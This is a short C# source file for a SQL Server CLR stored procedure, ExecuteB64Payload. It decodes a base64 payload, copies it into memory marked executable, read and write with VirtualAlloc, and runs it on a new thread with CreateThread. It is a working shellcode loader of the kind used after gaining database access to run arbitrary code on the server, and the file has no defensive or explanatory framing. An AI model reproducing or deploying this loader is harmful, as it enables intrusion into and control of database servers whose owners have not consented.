using System;

public partial class StoredProcedures
{
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecuteB64Payload(string base64EncodedPayload)
    {
        var bytes = Convert.FromBase64String(base64EncodedPayload);
        var mem = VirtualAlloc(IntPtr.Zero,(UIntPtr)bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bytes, 0, mem, bytes.Length);
        var threadId = IntPtr.Zero;
        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
    }
}
